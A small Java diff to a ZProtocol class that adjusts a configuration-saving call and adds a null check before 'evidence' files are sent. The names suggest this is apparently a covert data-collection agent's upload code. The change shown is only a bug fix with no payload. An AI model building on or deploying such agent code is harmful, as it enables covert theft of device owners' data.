@@ -582,7 +582,7 @@ public class ZProtocol extends Protocol {
 					Check.log(TAG + " Info: got NewConf"); //$NON-NLS-1$
 				}
 
-				ret = Protocol.saveNewConf(result, 8);
+				ret = Protocol.saveNewConf(result, 0);
 
 				if (ret) {
 					if (Cfg.DEBUG) {
@@ -881,6 +881,13 @@ public class ZProtocol extends Protocol {
 					continue;
 				}
 				final byte[] content = file.read();
+				if(content==null){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " Error: File is empty: " + fullLogName); //$NON-NLS-1$
+					}
+					continue;
+				}
+				
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Info: Sending file: " + EvidenceCollector.decryptName(logName)); //$NON-NLS-1$
 				}
